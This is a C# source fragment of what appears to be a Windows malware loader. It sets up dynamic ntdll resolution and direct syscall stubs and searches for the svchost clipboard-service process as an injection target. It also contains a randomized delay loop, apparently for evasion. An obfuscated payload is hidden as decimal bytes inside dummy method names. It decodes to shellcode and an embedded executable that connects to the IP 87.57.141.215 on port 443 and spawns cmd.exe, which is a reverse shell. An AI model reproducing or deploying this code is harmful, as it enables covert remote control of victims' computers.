public delegate int LdrLoadDllX(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
public static UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
{
		IntPtr proc = GetProcAddress(Resolver(), "LdrLoadDll");
		LdrLoadDllX LdrLoadDll = (LdrLoadDllX)Marshal.GetDelegateForFunctionPointer(proc, typeof(LdrLoadDllX));
		return (uint)LdrLoadDll(PathToFile, dwFlags, ref ModuleFileName, ref ModuleHandle);
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate bool RtlInitUnicodeStringX(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
public static void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
{
		IntPtr proc = GetProcAddress(Resolver(), "RtlInitUnicodeString");
		RtlInitUnicodeStringX RtlInitUnicodeString = (RtlInitUnicodeStringX)Marshal.GetDelegateForFunctionPointer(proc, typeof(RtlInitUnicodeStringX));
		RtlInitUnicodeString(ref DestinationString, SourceString);
}

public static int ReturnRight()
{
		Random number = new Random();
		int code = number.Next(100);
		int a, b;
		while ( code != 60)
		{
				code = number.Next(100);
		}
		a = code;
		code = number.Next(100);
		while ( code != 4)
		{
				code = number.Next(100);
		}
		b = code;
		return a + b;
}

/*
 const uint PS_REQUEST_BREAKAWAY = 1;
 const uint PS_NO_DEBUG_INHERIT =  2;
 const uint PS_INHERIT_HANDLES = 4;
 const uint PS_UNKNOWN_VALUE = 8;
 const uint PS_ALL_FLAGS = PS_REQUEST_BREAKAWAY |PS_NO_DEBUG_INHERIT |PS_INHERIT_HANDLES | PS_UNKNOWN_VALUE;
 UInt32 OBJ_CASE_INSENSITIVE = 0x40;
*/


[StructLayout(LayoutKind.Sequential)]
public struct THREAD_BASIC_INFORMATION
{
		public uint ExitStatus; // original: LONG NTSTATUS
		public uint TebBaseAddress; // original: PVOID
		public CLIENT_ID ClientId;
		public uint AffinityMask; // original: ULONG_PTR
		public uint Priority; // original: DWORD
		public uint BasePriority; // original: DWORD
}

private enum ThreadInfoClass : int
{
		ThreadBasicInformation = 0,
		ThreadQuerySetWin32StartAddress = 9
}

[DllImport("ntdll.dll", SetLastError = true)]
private static extern int NtQueryInformationThread( IntPtr threadHandle, ThreadInfoClass threadInformationClass, out THREAD_BASIC_INFORMATION threadInformation, ulong threadInformationLength, IntPtr returnLengthPtr);


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwWaitForSingleObjectX( IntPtr Object, bool Alertable, uint Timeout );
public static NTSTATUS ZwWaitForSingleObject( IntPtr Object, bool Alertable, uint Timeout )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwWaitForSingleObjectX ZwWaitForSingleObjectFunc = (ZwWaitForSingleObjectX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWaitForSingleObjectX));
						return (NTSTATUS)ZwWaitForSingleObjectFunc(Object, Alertable, Timeout);
				}

		}
}


public static int FindTheRightPID()
{
	int result = 0;
	ManagementClass mClass = new ManagementClass("Win32_Process");
	foreach (ManagementObject mObj in mClass.GetInstances())
	{
			if ( mObj["Name"].Equals("svchost.exe") )
			{
					string str1 = Convert.ToString( mObj["CommandLine"] );
					if (str1.Contains("ClipboardSvcGroup") & str1.Contains("cbdhsvc"))
					{
							result = (int)Convert.ToInt32(mObj["ProcessId"]);
							break;
					}
			}
	}
	return result;
}

public static bool aa232000000000000089073137200072129193008008000000186069119098048073129192132205000000065185004000000000086072137230072131228240072131236048199068036032000000000000232005000000000072137244094195072139196072137088008068137072032076137064024137080016085086087065084065085065086065087072141104169072129236144000000000072139241185076119038007232163006000000185073247002120072137069183076139224232146006000000185088164083229072137069191076139232232129006000000185016225138195076139248232116006000000185175177() { return false; }
public static bool aa092148072137069215072139248232099006000000185051000158149072137069223072139216232082006000000185068240053224076139240232069006000000069051210072137069199077133228015132022006000000077133237015132013006000000077133255015132004006000000072133255015132251005000000072133219015132242005000000077133246015132233005000000072133192015132224005000000072099126060072003254129063080069000000015133205005000000184100134000000102057071004015133190005000000068139071056069141090001069132195015133173005000000015183() { return false; }
public static bool aa071006065139218015183079020133192116040072131193036068139200072003207139081004133210117007139017065003208235002003017059211015071218072131193040077043203117226072141077231065255214139085235068141114255068003119080141066255247208072141074255068035240139195072003200072141066255072247208072035200076059241015133064005000000072139079048065185004000000000065184000048000000065139214065255215072139216072133192117021068141072004065184000048000000065139214051201065255215072139216068139093127065190001000000() { return false; }
public static bool aa000069132222015132177000000000139070060137067060139086060235011139202065003214138004049136004025059087084114240069051255072099123060069139215072003251072137125207015183071020102068059127006115062076141071040076003192069139207069057056118031065139080004065139072252065139193069003206072003200072003208138004050136004025069059008114225015183071006069003214073131192040068059208114201076139211076043087048015132222000000000068057191180000000000015132209000000000068139135176000000000076003195069057056015() { return false; }
public static bool aa132190000000000065188002000000000077141072008233147000000000069051255065139215068057127084015134093255255255139202065003214138004049136004025059087084114240233072255255255065015183001015183200102193233012102131249010117017065139008037255015000000072003195076001020001235073102131249003117014037255015000000072141012003065139194235046102065059206117021037255015000000072141012003073139194072193232016015183192235019102065059204117020037255015000000072141012003065015183194065139016072001004010077003204() { return false; }
public static bool aa065139064004073003192076059200117134077139193069057057015133076255255255076139101183068057191148000000000015132069001000000068139135144000000000069139239076003195073141064012235007069003238072141064020068057056117244065139195131224004137069179015132130000000000069059238118125065193235016069141077255068137093127069139223069133201116111077139208065015016002051210065139205065043203105246253067003000184255127000000247241051210129198195158038000065141012006139198193232016037255127000000247241065003195() { return false; }
public static bool aa069003222072141012128065139084136016065015016012136065015017004136065139066016065137068136016065015017010065137082016077141082020069059217114156235006139069179137069127139183144000000000072003243139070012133192116123139125127139200072003203065255212068139062076139224068139118016076003251076003243073139015072133201116045072139125191121005015183209235007072141081002072003211073139204255215073131199008073137006073131198008073139015072133201117218139125127069051255068057125179116015065131253001118009() { return false; }
public static bool aa105207232003000000255085199139070032072131198020076139101183133192117140072139125207076139109191068057191244000000000116104068139183240000000000073131198004076003243235083065139014072003203065255212065139118008076139224069139126012072003243076003251235037073139015072133201121005015183209235007072141081002072003211073139204065255213072137006072131198008073131199008051192072057006117212076139101183073131198032069051255069057062117168069139247015183071020065188001000000000102068059127006015131207000() { return false; }
public static bool aa000000076139125215072141119060072003240069051201068057078236015132160000000000139014139209193234030139193065035212193232029193233031065035196117036133210117014247217069027192065131224007069003196235079247217184002000000000069027192068035192068003192235061133210117032133201117006068141066016235047133210117018133201116008065184128000000000235031068139069175235029133201117006068141065032235015068139069175133201184064000000000068015069192068137069175247006000000000004116009065015186232009068137069175() { return false; }
public static bool aa139078232076141077175139086236072003203065255215069051201015183071006069003244072131198040068059240015130066255255255069051255069051192051210072131201255255085223068057191212000000000116036139135208000000000072139116024024235015069051192065139212072139203255208072141118008072139006072133192117233139071040077139196072003195065139212072139203255208139117103133246015132150000000000068057191140000000000015132137000000000139143136000000000072003203068139089024069133219116119068057121020116113068139073() { return false; }
public static bool aa032065139255139081036076003203072003211069133219116092069139001069139215076003195116081235016015190192065003194068139208065193202013077003196065138000132192117233065059242117005072133210117022184002000000000065003252072003208073131193004065059251115026235188139073028015183018072003203139004145139085119072003195072139077111255208072139195235002051192072139156036208000000000072129196144000000000065095065094065093065092095094093195204204072137092036008072137116036016087072131236016101072139004037096() { return false; }
public static bool aa000000000139241072139080024076139074016077139065048077133192015132180000000000065015016065088073099064060051210077139009243015127004036066139156000136000000000133219116212072139004036072193232016068015183208069133210116033072139076036008069139218015190001193202013128057097124003131194224003208072255193073131235001117231077141020024051201065139122032073003248065057074024118143139031069051219073003216072141127004015190003072255195065193203013068003216128123255000117237065141004019059198116013255193() { return false; }
public static bool aa065059074024114209233091255255255065139066036003201073003192015183020001065139074028073003200139004145073003192235002051192072139092036032072139116036040072131196016095195000000144000003000000000004000000000255255000000184000000000000000000000064000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000128000000000014031186014000180009205033184001076205033084104105115032112114111103114097109032099097110110111116032098101032114117110032105110032068079() { return false; }
public static bool aa083032109111100101046013013010036000000000000000000000080069000000100134017000082117141094000108000000223003000000240000038032011002002030000030000000000058000000000010000000048019000000000016000000000000216109000000000000000016000000000002000000004000000000000000000000005000002000000000000000000064001000000006000000069179001000003000000000000000032000000000000000000016000000000000000000000000016000000000000000000016000000000000000000000000000000016000000000000128000000069000000000000144000000200() { return false; }
public static bool aa006000000000000000000000000000000000080000000040002000000000000000000000000000000000192000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000096064000000040000000000000000000000000000000000000000000000000000000000192145000000112001000000000000000000000000000000000000000000000000000000000000000000000000000000046116101120116000000000152028000000000016000000000030000000000006000000000000000000000000000000000000000000096000080096046100097116097000000000128000000000() { return false; }
public static bool aa000048000000000002000000000036000000000000000000000000000000000000000000064000080192046114100097116097000000224002000000000064000000000004000000000038000000000000000000000000000000000000000000064000096064046112100097116097000000040002000000000080000000000004000000000042000000000000000000000000000000000000000000064000048064046120100097116097000000172001000000000096000000000002000000000046000000000000000000000000000000000000000000064000048064046098115115000000000000032009000000000112000000000000000() { return false; }
public static bool aa000000000000000000000000000000000000000000000000000128000096192046101100097116097000000069000000000000128000000000002000000000048000000000000000000000000000000000000000000064000048064046105100097116097000000200006000000000144000000000008000000000050000000000000000000000000000000000000000000064000048192046067082084000000000000088000000000000160000000000002000000000058000000000000000000000000000000000000000000064000064192046116108115000000000000016000000000000176000000000002000000000060000000000000() { return false; }
public static bool aa000000000000000000000000000000064000064192046114101108111099000000100000000000000192000000000002000000000062000000000000000000000000000000000000000000064000048066047052000000000000000000080000000000000208000000000002000000000064000000000000000000000000000000000000000000064000080066047049057000000000000000008031000000000224000000000032000000000066000000000000000000000000000000000000000000064000016066047051049000000000000000073001000000000000001000000002000000000098000000000000000000000000000000000() { return false; }
public static bool aa000000000064000016066047052053000000000000000034002000000000016001000000004000000000100000000000000000000000000000000000000000000064000016066047053055000000000000000072000000000000032001000000002000000000104000000000000000000000000000000000000000000064000064066047055048000000000000000155000000000000048001000000002000000000106000000000000000000000000000000000000000000064000016066000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool aa000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool a1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool aa000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000072141013249095000000233116025000000015031064000065085065084085087086083072131236040133210073137204077137197117122139021236095000000049192133210126089131234001072139029244049000000049237191001000000000137021207095000000076139037248() { return false; }
public static bool aa129000000235008185232003000000065255212072137232240072015177059072133192072137198117232072139061207049000000139007131248002015132233000000000185031000000000232234024000000184001000000000072131196040091094095093065092065093195015031132000000000000000131250001015133170000000000101072139004037048000000000072139029119049000000049255072139112008072139045130129000000235024015031132000000000000000072057198015132183000000000185232003000000255213072137248240072015177051072133192117227049255072139053074049() { return false; }
public static bool aa000000139006131248001015132239000000000139006133192015132165000000000139006131248001015132186000000000133255015132130000000000072139005219048000000072139000072133192116013077137232186002000000000076137225255208131005215094000000001184001000000000072131196040091094095093065092065093195184001000000000072131196040091094095093065092065093195072141013148094000000232015025000000199007000000000000072135051184001000000000072131196040091094095093065092065093195015031064000191001000000000233085255255255102() { return false; }
public static bool aa015031068000000049192072135003233116255255255102015031068000000072139021201048000000199006001000000000072139013172048000000232159023000000233061255255255102144072139021137048000000072139013114048000000232133023000000199006002000000000233040255255255102144185031000000000232118023000000233012255255255144065084085087086083072131236032072139053015048000000133210072137207137211137022076137197117084139005243093000000133192116051232002009000000073137232049210072137249232154001000000073137232137218072137() { return false; }
public static bool aa249232200022000000073137232137218072137249065137196232184253255255133192117003069049228068137224199006255255255255072131196032091094095093065092195232184008000000141067255131248001118032073137232137218072137249232072001000000131251003065137196117202235164102015031132000000000000000073137232137218072137249232099253255255133192116171073137232137218072137249232082022000000133192065137196116091131251001117182232177003000000073137232186001000000000072137249232246000000000133192065137196015133117255255() { return false; }
public static bool aa255073137232049210072137249232222000000000073137232049210072137249232012022000000073137232049210072137249232255252255255233073255255255102046015031132000000000000000131251001015133051255255255235217015031068000000072131236072072139005085047000000199000000000000000131250001116010072131196072233177254255255144076137068036056137084036052072137076036040232061003000000232040012000000076139068036056139084036052072139076036040072131196072233129254255255144072137202072141013118092000000233033022000000144() { return false; }
public static bool aa072141013009000000000233228255255255015031064000195144144144144144144144144144144144144144144144085072137229072131236016199069252001000000000129125252064066015000127006131069252001235241144072131196016093195085072129236176002000000072141172036128000000000072137141064002000000137149072002000000076137133080002000000131189072002000000001116038131189072002000000000015132120001000000131189072002000000002015132110001000000131189072002000000003233099001000000102199133016002000000002000185187001000000072() { return false; }
public static bool aa139005219126000000255208102137133018002000000072141013180043000000072139005204126000000255208137133020002000000072141069064072137194185002002000000072139005161126000000255208199068036040000000000000199068036032000000000000065185000000000000065184006000000000186001000000000185002000000000072139005106126000000255208072137133040002000000072141133016002000000072139141040002000000072199068036048000000000000072199068036040000000000000072199068036032000000000000065185000000000000065184016000000000072137() { return false; }
public static bool aa194072139005026126000000255208072141069208065184104000000000186000000000000072137193232065020000000199069208104000000000199069012001001000000072139133040002000000072137069048072139069048072137069040072139069040072137069032072141133224001000000072137068036072072141069208072137068036064072199068036056000000000000072199068036048000000000000199068036040000000000000199068036032001000000000065185000000000000065184000000000000072141021157042000000185000000000000072139005066124000000255208184000000000000() { return false; }
public static bool aa235009144235001144184001000000000072129196176002000000093195144144144144144144144255037122125000000144144255037106125000000144144255037090125000000144144255037074125000000144144255037058125000000144144015031132000000000000000072131236040072139005037026000000072139000072133192116029255208072139005020026000000072141080008072139064008072137021005026000000072133192117227072131196040195144102046015031132000000000000000086083072131236040072139013179043000000072139017131250255137208116057133192116032137() { return false; }
public static bool aa194131232001072141028209072041194072141116209248015031064000255019072131235008072057243117245072141013126255255255072131196040091094233035253255255015031000049192235002137208068141064001074131060193000076137194117240235177102046015031132000000000000000139005154089000000133192116006195015031068000000199005134089000000001000000000233113255255255144065084085087086083072131236048072139029175025000000072184050162223045153043000000072057195072199068036032000000000000116023072247211072137029157025000000() { return false; }
public static bool aa072131196048091094095093065092195102144072141076036032255021013123000000072139116036032255021234122000000065137196255021233122000000137197255021249122000000072141076036040137199255021004123000000072051116036040068137224072186255255255255255255000000072049240137238072049198137248072049240072033208072057216116037072137194072247210072137005024025000000072137021033025000000072131196048091094095093065092195102015031068000000072186204093032210102212255255072184051162223045153043000000235203102046015031() { return false; }
public static bool aa132000000000000000085086083072137229072131236112072137206072141013172088000000255021142122000000072139029151089000000072141085216069049192072137217255021127122000000072133192015132163000000000072141085224073137193073137216072199068036056000000000000072141013108088000000072137084036048072141085232072137076036032049201072137084036040072139085216255021069122000000072139005062089000000049201072137053189088000000072137005038093000000072184009004000192001000000000072137005005093000000072139005062024000() { return false; }
public static bool aa000072137069240072139005067024000000072137069248255021009122000000072141013226039000000255021028122000000255021142121000000186009004000192072137193255021248121000000232003017000000072139069024072137005208088000000072141069008072137005101088000000233123255255255144144144144144144144144072131236040131250003116023133210116019184001000000000072131196040195102015031132000000000000000232091011000000184001000000000072131196040195144086083072131236040072139005003041000000131056002116006199000002000000000() { return false; }
public static bool aa131250002116019131250001116064184001000000000072131196040091094195102144072141029105135000000072141053098135000000072057222116223072139003072133192116002255208072131195008072057222117237184001000000000072131196040091094195232233010000000184001000000000072131196040091094195015031000102046015031132000000000000000049192195144144144144144144144144144144144144144072137200195102144102046015031132000000000000000072137200195144144144144144144144144144144144144065084085087086083072131236080072099053115092() { return false; }
public static bool aa000000133246072137203072137213076137199015142102001000000072139005095092000000049201072131192024144072139016072057211114020076139064008069139064008076001194072057211015130137000000000131193001072131192040057241117217072137217232065012000000072133192073137196015132082001000000072139005022092000000072141052182072193230003072001240076137096032199000000000000000232068013000000065139076036012072141084036032065184048000000000072001193072139005226091000000072137076048024255021095120000000072133192015132() { return false; }
public static bool aa230000000000139068036068141080252131226251116008131232064131224191117098131005175091000000001131255008115041064246199004015133144000000000133255116016015182069000064246199002136003015133151000000000072131196080091094095093065092195137248131239001072139084005248131255008072137084003248114225131231248049192137194131192008072139076021000057248072137012019114238235200072003053081091000000065184064000000000072139076036032072139084036056073137241072137078008072137086016255021176119000000133192015133110() { return false; }
public static bool aa255255255255021042119000000072141013075038000000137194232028017000000139069000137255137003139068061252137068059252233112255255255049246233200254255255137255015183068061254102137068059254233088255255255072139005225090000000072141013210037000000065139084036008076139068048024232211016000000072141013156037000000072137218232196016000000144015031000085065087065086065085065084087086083072131236056072141172036128000000000139029146090000000133219116017072141101184091094095065092065093065094065095093195199() { return false; }
public static bool aa005115090000000001000000000232014011000000072152072141004128072141004197030000000000072131224240232071013000000076139037080038000000199005074090000000000000000000072139053079038000000072041196072141068036032072137005056090000000076137224072041240072131248007126150072131248011139022015142200000000000133210015132164000000000076057230015131121255255255076141118008073131196007076139045040038000000072141125168077041244073193236003078141100230008235010102015031068000000073131198008139078004065184004000() { return false; }
public static bool aa000000072137250139006076137246076001233003001137069168232062253255255077057230117217139005183089000000049246076139037050118000000133192015142020255255255102144072139005161089000000072001240068139000069133192116014072139080016073137249072139072008065255212131195001072131198040059029119089000000124209233222254255255139078004133201015133081255255255139086008133210117029139086012072131198012015031000133210015133056255255255139070004133192015133045255255255139086008131250001015133047001000000076139045() { return false; }
public static bool aa090037000000072131198012073191000000000000255255255255076141117168076057230114072233128254255255015134184000000000131250032015132127000000000131250064015133224000000000072139017065184008000000000076137247072041194076001202072137085168076137242232088252255255072131198012076057230015131018255255255139078004139006015182086008076001233076001232131250016076139008117166068015183001076137242076137247077137194073129202000000255255102069133192077015072194073041192077001200076137069168065184002000000000232() { return false; }
public static bool aa003252255255235169144139017076137247073137208076009250069133192073015073208065184004000000000072041194076001202072137085168076137242232214251255255233121255255255144131250008117053068015182001076137242076137247077137194073129202000255255255069132192077015072194073041192077001200076137069168065184001000000000232155251255255233062255255255072141013167035000000072199069168000000000000232018014000000072141013091035000000232006014000000144144144144144144072131236040139001061145000000192119099061141000() { return false; }
public static bool aa000192115123061008000000192015132005001000000015135203000000000061002000000128015132244000000000061005000000192015133195000000000049210185011000000000232001011000000072131248001015132047001000000072133192015132060001000000185011000000000255208049192072131196040195015031132000000000000000061148000000192015132181000000000119055061146000000192015132156000000000061147000000192117111049210185008000000000232173010000000072131248001116111072133192116088185008000000000255208049192072131196040195061149000() { return false; }
public static bool aa000192116105061150000000192117060049210185004000000000232122010000000072131248001015132136000000000072133192015132181000000000185004000000000255208049192072131196040195144061029000000192116203061140000000192116038184001000000000072131196040195015031132000000000000000186001000000000185008000000000232041010000000232172009000000049192072131196040195015031068000000049210185008000000000232012010000000072131248001015133091255255255186001000000000185008000000000232243009000000049192233007255255255015031() { return false; }
public static bool aa064000186001000000000185004000000000232217009000000049192233237254255255102046015031132000000000000000186001000000000185011000000000232185009000000049192233205254255255184004000000000233195254255255065084085087086083072131236032232145007000000072137197139005096086000000133192117037072133237116032072141013248033000000199005070086000000001000000000232169005000000072133192116020184001000000000072131196032091094095093065092195015031064000072141029057087000000185048000000000049246072141021043086000000() { return false; }
public static bool aa072137223243072171076141037238253255255185032000000000072137215243072171073041236072137215235046198007009072131198001072131195012068137103004139072012137075244003072008072137248072131199008072041232137067252137075248072131254032116050072137241232117006000000072133192117197072133246137242015132113255255255015031068000000072141013185086000000073137232255021176113000000233087255255255186032000000000235228015031064000083072131236032072139017139002072137203137193129225255255255032129249067067071032015() { return false; }
public static bool aa132191000000000061145000000192119104061141000000192115124061008000000192015132176000000000015135244000000000061002000000128015132159000000000061005000000192117031049210185011000000000232090008000000072131248001015132081001000000072133192015133015001000000072139005008085000000072133192015132016001000000072137217072131196032091072255224015031064000061148000000192015132181000000000119088061146000000192116070061147000000192117198049210185008000000000232001008000000072131248001015132223000000000072133() { return false; }
public static bool aa192116171185008000000000255208184255255255255072131196032091195015031132000000000000000246066004001015133055255255255184255255255255072131196032091195061149000000192116238061150000000192015133106255255255049210185004000000000232165007000000072131248001015132179000000000072133192015132075255255255185004000000000255208184255255255255235158061029000000192116204061140000000192015133043255255255235162015031132000000000000000049210185008000000000232092007000000072131248001015133091255255255186001000000() { return false; }
public static bool aa000185008000000000232067007000000184255255255255233083255255255144185011000000000255208184255255255255233065255255255049192233058255255255015031132000000000000000186001000000000185008000000000232009007000000232140006000000233049255255255186001000000000185011000000000232240006000000131200255233002255255255186001000000000185004000000000232217006000000131200255233235254255255144144144144144144144144144085087086083072131236040072141013065086000000255021075111000000072139029020086000000072133219116051() { return false; }
public static bool aa072139045192111000000072139061081111000000144139011255213072137198255215133192117014072133246116009072139067008072137241255208072139091016072133219117220072141013245085000000072131196040091094095093072255037054111000000102015031068000000085087086083072131236040139005186085000000049246133192137205072137215117011137240072131196040091094095093195186024000000000185001000000000232069006000000072133192072137195116061137040072141013156085000000072137120008255021162110000000072139005107085000000072141013() { return false; }
public static bool aa132085000000072137029093085000000072137067016255021195110000000137240072131196040091094095093195190255255255255235154144083072131236032139005061085000000133192137203117015049192072131196032091195015031128000000000000072141013057085000000255021067110000000072139005012085000000072133192116026139016057211117011235079139017057218116041072137200072139072016072133201117238072141013006085000000255021080110000000049192072131196032091195015031132000000000000000072139081016072137080016232115005000000072141() { return false; }
public static bool aa013220084000000255021038110000000235212015031064000072139080016072137193072137021162084000000235216083072131236032131250001015132146000000000114048131250002116027131250003117027139005136084000000133192116017232071254255255235010015031068000000232139004000000184001000000000072131196032091195139005098084000000133192015133130000000000139005084084000000131248001117220072139013064084000000072133201116017072139089016232226004000000072133219072137217117239072141013067084000000072199005024084000000000000() { return false; }
public static bool aa000000199005022084000000000000000000255021048109000000235155102015031068000000139005002084000000133192116022199005244083000000001000000000184001000000000072131196032091195144072141013249083000000255021059109000000235219144232155253255255233116255255255144144144144144144072099065060072001193049192129057080069000000116001195049192102129121024011002015148192195102144102129057077090116009049192195102015031068000000235206015031064000102046015031132000000000000000072099065060072001193015183065020072141() { return false; }
public static bool aa068001024015183073006133201116041131233001072141012137076141076200040068139064012073057208076137193119008003072008072057209119011072131192040076057200117227049192195102144102046015031132000000000000000087086083072131236032072137206232177003000000072131248008119107072139021132028000000102129058077090117093072137209232069255255255133192116081072099074060072001209015183065020072141092001024015183065006133192116057131232001072141004128072141124195040235009072131195040072057251116034065184008000000000() { return false; }
public static bool aa072137242072137217232073003000000133192117226072137216072131196032091094095195102144049219072137216072131196032091094095195015031000072131236040076139005005028000000102065129056077090072137202117087076137193232194254255255133192116075073099064060072137209076041193073001192065015183080006065015183064020133210073141068000024116043131234001072141020146076141076208040102144068139064012076057193076137194114008003080008072057209114011072131192040076057200117227049192072131196040195102144102046015031132() { return false; }
public static bool aa000000000000000072131236040072139021133027000000069049192102129058077090116011068137192072131196040195015031000072137209232056254255255133192116233072099066060068015183068016006068137192072131196040195102144072131236040076139005069027000000102065129056077090072137202117082076137193232002254255255133192116070073099072060076001193015183065020072141068001024015183073006133201116046131233001072141012137072141076200040102046015031132000000000000000246064039032116009072133210116015072131234001072131192() { return false; }
public static bool aa040072057200117232049192072131196040195144072131236040072139021213026000000102129058077090117030072137209232150253255255133192184000000000000072015069194072131196040195102015031068000000049192072131196040195102015031132000000000000000072131236040076139005149026000000049192102065129056077090072137202116008072131196040195015031000076137193232072253255255133192116236073099064060072137209076041193073001192065015183080006065015183064020133210073141068000024116049131234001072141020146076141076208040015() { return false; }
public static bool aa031132000000000000000068139064012076057193076137194114008003080008072057209114016072131192040076057200117227049192072131196040195139064036247208193232031072131196040195015031068000000102046015031132000000000000000072131236040076139029245025000000102065129059077090065137201117088076137217232178252255255133192116076073099067060076001216139144144000000000133210116059015183072020072141076008024015183064006133192116042131232001072141004128072141068193040068139081012076057210077137208114009068003065008() { return false; }
public static bool aa076057194114016072131193040072057193117226049192072131196040195076001218117014235242015031064000065131233001072131194020139074004133201117007139066012133192116216069133201127229139066012076001216072131196040195144144144144144144144144144144219227195144144144144144144144144144144144144144081080072061000016000000072141076036024114025072129233000016000000072131009000072045000016000000072061000016000000119231072041193072131009000088089195144144144144144144144144144144144144144144184001000000000195144() { return false; }
public static bool aa144144144144144144144144144255037202105000000144144255037186105000000144144255037170105000000144144255037154105000000144144255037130105000000144144255037114105000000144144255037098105000000144144255037082105000000144144255037066105000000144144255037034105000000144144255037018105000000144144015031132000000000000000072133201116026049192072199065016000000000000072199065008000000000000072199001000000000000195184255255255255195144102046015031132000000000000000085087086083072131236040072133201072137203() { return false; }
public static bool aa072137215015132153000000000185008000000000232079001000000072131059000116093072139115008072139067016072057240116032072141070008185008000000000072137067008072137062232031001000000049192072131196040091094095093195072139011072041206072137240072193248003072193224004072137194072137197232240000000000072133192116066072137003072001198072001232072137067016235176186008000000000185032000000000232021255255255072133192072137198072137003116025072137067008072141128000001000000072137067016235128144184255255255255() { return false; }
public static bool aa235148185008000000000232167000000000184255255255255235131015031132000000000000000087086083072131236032072137207185008000000000232140000000000072139055185008000000000072199071016000000000000072139095008072199007000000000000072199071008000000000000232092000000000072133246116036072131235008072057222119019072139003072133192116239255208072131235008072057222118237072137241232107254255255049192072131196032091094095195144083072131236032137203232044000000000137217072141020073072193226004072001208072131196() { return false; }
public static bool aa032091195144255037186103000000144144255037130103000000144144255037114103000000144144255037082103000000144144255037058103000000144144255037042103000000144144255037026103000000144144255037010103000000144144255037250102000000144144255037234102000000144144255037218102000000144144255037202102000000144144255037186102000000144144255037170102000000144144255037154102000000144144255037138102000000144144255037122102000000144144255037106102000000144144255037090102000000144144255037074102000000144144255037058() { return false; }
public static bool aa102000000144144255037042102000000144144255037026102000000144144255037010102000000144144255037250101000000144144255037234101000000144144255037218101000000144144015031132000000000000000086083072131236056072141068036088072137203185002000000000072137084036088076137068036096076137076036104072137068036040232212254255255065184027000000000186001000000000072141013114020000000073137193232018253255255072139116036040185002000000000232171254255255072137218072137193073137240232205252255255232008253255255144144() { return false; }
public static bool aa144144144144144144233043231255255144144144144144144144144144144144255255255255255255255255096044216109000000000000000000000000000000000000255255255255255255255255000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool a2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool a3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000144044216109000000000000000000000000000000000000255255255255255255255255000000000000000000000000002000000000000000000000000000000000000000000000128042216109000000000000176041216109000000000000128041216109000000000000000000000000000000000() { return false; }
public static bool aa000240042216109000000000000000000000000000000000000050162223045153043000000000000000000000000000000205093032210102212255255000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool a4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }
public static bool aa000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000056055046053055046049052049046050049053000099109100046101120101000000000000000000000000000000032117216109000000000000064112216109000000000000000000000000000000000000000000000000000000000000176024216109() { return false; }
